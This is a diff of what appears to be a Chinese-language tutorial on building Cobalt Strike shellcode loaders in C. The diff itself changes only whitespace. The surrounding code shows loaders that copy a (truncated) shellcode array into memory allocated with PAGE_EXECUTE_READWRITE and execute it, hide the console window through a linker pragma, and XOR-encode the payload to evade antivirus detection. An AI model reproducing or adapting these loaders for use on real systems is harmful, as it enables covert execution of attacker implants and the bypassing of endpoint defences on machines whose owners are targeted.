@@ -7,6 +7,7 @@ Attacks->Packages->Payload Generator（选择之前创建的监听器，输出C�
 ```
 #include <windows.h>
 #include <stdio.h>
+
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 
 /* length: 891 bytes */
@@ -25,10 +26,12 @@ int main() {
 ```
 #include <windows.h>
 #include <stdio.h>
+
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 
 // length: 891 bytes
 unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41...";
+
 int main() {
     char* old = (char *)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     memcpy(old, buf, sizeof(buf));
@@ -56,7 +59,6 @@ int b = sizeof(buf);
 unsigned char str[891] = { 0 };
 
 int main() {
-
     printf("char array length=%d\n", b);
     printf("\n");
 
@@ -75,12 +77,14 @@ int main() {
 ```
 #include <stdio.h>
 #include <windows.h>
+
 unsigned char buf[] = "\xfd\x49\x82\xe5\xf1\xe9\xc9\x1...";
 
 int main() {
     for (int i = 0; i < sizeof(buf); i++) {
         _InterlockedXor8( (volatile char *)buf + i, 1 );
     }
+    
     char* old = (char *)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     memcpy(old, buf, sizeof(buf));
     ((void(*)())old)();
